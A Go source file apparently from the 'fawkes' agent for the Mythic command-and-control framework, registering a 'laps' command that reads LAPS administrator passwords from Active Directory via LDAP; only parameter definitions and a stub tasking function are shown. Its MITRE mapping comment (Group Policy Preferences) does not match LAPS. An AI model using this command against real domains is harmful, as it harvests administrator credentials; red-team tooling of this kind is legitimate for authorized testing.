package agentfunctions

import (
	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "laps",
		Description:         "laps - Read LAPS (Local Administrator Password Solution) passwords from Active Directory via LDAP. Supports LAPS v1 (ms-Mcs-AdmPwd) and Windows LAPS v2 (ms-LAPS-Password). Requires read access to LAPS attributes.",
		HelpString:          "laps -server <DC> -username <user@domain> -password <pass> [-filter <computer>]",
		Version:             1,
		MitreAttackMappings: []string{"T1552.006"}, // Unsecured Credentials: Group Policy Preferences
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "server",
				CLIName:          "server",
				ModalDisplayName: "Domain Controller",
				Description:      "Domain controller IP or hostname",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{{
					ParameterIsRequired: true,
					GroupName:           "Default",
				}},
			},
			{
				Name:             "username",
				CLIName:          "username",
				ModalDisplayName: "Username",
				Description:      "LDAP username (e.g., user@domain.local)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{{
					ParameterIsRequired: true,
					GroupName:           "Default",
				}},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "LDAP password",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{{
					ParameterIsRequired: true,
					GroupName:           "Default",
				}},
			},
			{
				Name:             "filter",
				CLIName:          "filter",
				ModalDisplayName: "Computer Filter",
				Description:      "Filter by computer name (substring match)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{{
					ParameterIsRequired: false,
					GroupName:           "Default",
				}},
			},
			{
				Name:             "use_tls",
				CLIName:          "use_tls",
				ModalDisplayName: "Use TLS (LDAPS)",
				Description:      "Use LDAPS (port 636) instead of LDAP (port 389)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				DefaultValue:     false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{{
					ParameterIsRequired: false,
					GroupName:           "Default",
				}},
			},
		},
		TaskFunctionCreateTasking: func(task *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			return agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  task.Task.ID,
			}
		},
	})
}
